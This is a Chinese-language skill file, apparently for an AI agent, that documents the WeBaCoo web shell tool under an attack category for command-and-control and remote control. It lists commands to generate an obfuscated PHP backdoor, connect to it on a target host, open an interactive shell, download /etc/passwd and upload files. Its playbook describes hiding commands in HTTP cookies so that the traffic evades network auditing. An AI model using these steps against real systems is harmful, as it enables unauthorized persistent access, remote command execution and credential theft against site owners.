---
name: webacoo-encoded-shell
description: WeBaCoo: HTTP 隐蔽信道远控。信号:持久化,后门,连接 WebShell,交互 shell 模式,下载。
---

# WeBaCoo

- 攻击大类:C15 C2与远控
- 上游仓库:https://github.com/anestisb/WeBaCoo
- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/anestisb/WeBaCoo
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `python webacoo -g -o shell.php` | 生成混淆 PHP WebShell |
| `python webacoo -t -u https://t.com/shell.php` | 连接 WebShell |
| `:shell` | 交互 shell 模式 |
| `:download /etc/passwd` | 下载 |
| `:upload local.txt /tmp/` | 上传 |

## 攻击场景 Playbook

### HTTP 隐蔽信道远控

```bash
python webacoo -g -o s.php && 上传
python webacoo -t -u https://t.com/images/s.php
# 请求伪装成正常页面访问,Cookie 传指令,流量特征低
```

## 注意事项

混淆 PHP WebShell,通信藏在 HTTP Cookie 中,网络层难以审计,老牌隐蔽 C2。
